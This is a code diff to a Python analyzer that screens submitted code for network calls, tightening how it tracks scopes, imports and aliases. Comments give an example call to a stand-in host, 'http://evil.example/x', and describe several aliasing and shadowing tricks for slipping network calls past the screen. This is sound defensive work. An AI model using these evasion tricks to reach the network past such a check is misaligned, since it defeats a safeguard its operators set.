@@ -17117,15 +17117,31 @@ def _check_signal_escape_patterns(code: str):
                 for name in _binding_names(node):
                     if name != getattr(node, "name", None):
                         self.shadow_lines.setdefault(name, []).append((where, id(node)))
+            # Decorators, defaults, annotations and bases are evaluated in the ENCLOSING scope, at
+            # the moment the def is executed, BEFORE any parameter is bound. Visiting them inside
+            # the new scope let a parameter shadow a call the parameter cannot possibly reach:
+            # `from requests import get as fetch` then
+            # `def f(fetch = print, x = fetch("http://evil.example/x"))` really calls the imported
+            # `requests.get` while defining `f`, and the `fetch` parameter hid it. Only the body
+            # belongs to the new scope.
+            for field, value in ast.iter_fields(node):
+                if field == "body":
+                    continue
+                if isinstance(value, list):
+                    for item in value:
+                        if isinstance(item, ast.AST):
+                            self.visit(item)
+                elif isinstance(value, ast.AST):
+                    self.visit(value)
             self.scope_stack.append(id(node))
             try:
-                for _field, value in ast.iter_fields(node):
-                    if isinstance(value, list):
-                        for item in value:
-                            if isinstance(item, ast.AST):
-                                self.visit(item)
-                    elif isinstance(value, ast.AST):
-                        self.visit(value)
+                body = node.body
+                if isinstance(body, list):
+                    for item in body:
+                        if isinstance(item, ast.AST):
+                            self.visit(item)
+                elif isinstance(body, ast.AST):
+                    self.visit(body)
             finally:
                 self.scope_stack.pop()
 
@@ -17144,6 +17160,13 @@ def _check_signal_escape_patterns(code: str):
                     self.module_aliases.setdefault(alias.asname, set()).add(alias.name)
                     self._register_alias(alias.asname, node)
                     registered.add(alias.asname)
+                elif not alias.asname and alias.name.partition(".")[0] in _NETWORK_ROOTS:
+                    # `import requests` needs no alias entry, since the name IS the module, but it
+                    # is still a binding of that name: without recording it, the import read as a
+                    # shadow of itself and a later `r = requests` was taken to copy something
+                    # already rebound. `import urllib.request` binds the root, `urllib`.
+                    self._register_alias(alias.name.partition(".")[0], node)
+                    registered.add(alias.name.partition(".")[0])
             self._rebind(node, exempt = registered)
             self.generic_visit(node)
 
@@ -17182,7 +17205,7 @@ def _check_signal_escape_patterns(code: str):
             self._rebind(node, exempt = registered)
             self.generic_visit(node)
 
-        def _modules_named_by(self, value) -> "set[str]":
+        def _modules_named_by(self, value, at) -> "set[str]":
             """Every network module a value can name, following aliases, so `r = requests` keeps
             `r.get(...)` screened instead of letting the assignment shed the module.
 
@@ -17199,9 +17222,23 @@ def _check_signal_escape_patterns(code: str):
             if not isinstance(cur, ast.Name):
                 return set()
             parts.insert(0, cur.id)
+            if self._is_shadowed(parts[0], at):
+                # The source of the copy was rebound before this line, so it no longer names the
+                # module: `import requests as r; r = object(); s = r` must not hand `s` a stale
+                # `requests`, or a later `s.get(...)` is refused for a call that cannot reach it.
+                return set()
             heads = self.module_aliases.get(parts[0]) or {parts[0]}
             found = {".".join(head.split(".") + parts[1:]) for head in heads}
-            return {fq for fq in found if fq in _NETWORK_MODULES}
+            # A package that merely CONTAINS a network module counts as well: `import
+            # urllib.request` binds `urllib`, so `u = urllib` then `u.request.urlopen(...)` is the
+            # same call written through the parent, and requiring the whole module here let it
+            # past.
+            return {
+                fq
+                for fq in found
+                if fq in _NETWORK_MODULES
+                or any(module.startswith(f"{fq}.") for module in _NETWORK_MODULES)
+            }
 
         def _functions_named_by(self, value, at) -> "set[str]":
             """Every network FUNCTION a value can name, the counterpart of `_modules_named_by`.
@@ -17211,6 +17248,10 @@ def _check_signal_escape_patterns(code: str):
             target as shadowed and left the later call with no candidate at all.
             """
             if isinstance(value, ast.Name):
+                if self._is_shadowed(value.id, at):
+                    # Same stale-source rule as `_modules_named_by`: `fetch = print` before
+                    # `g = fetch` means `g` is `print`, not the imported `requests.get`.
+                    return set()
                 return set(self.func_aliases.get(value.id) or ())
             if isinstance(value, ast.Attribute):
                 return {
@@ -17225,7 +17266,7 @@ def _check_signal_escape_patterns(code: str):
                 self.generic_visit(node)
                 return
             at = (getattr(node, "lineno", 0), getattr(node, "col_offset", 0))
-            carried = self._modules_named_by(node.value)
+            carried = self._modules_named_by(node.value, at)
             carried_functions = self._functions_named_by(node.value, at)
             registered: set[str] = set()
             for target in node.targets:
